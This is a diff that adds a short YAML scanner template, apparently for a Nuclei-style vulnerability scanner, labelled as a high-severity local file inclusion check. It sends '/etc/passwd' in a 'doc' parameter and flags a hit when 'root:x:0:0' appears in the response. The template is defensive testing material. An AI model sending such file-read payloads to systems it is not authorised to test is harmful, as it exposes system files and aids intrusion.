@@ -1,0 +1,20 @@
+id: lfi7-257
+name: 'Deep traversal in doc'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via doc'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      doc:
+        - '/etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
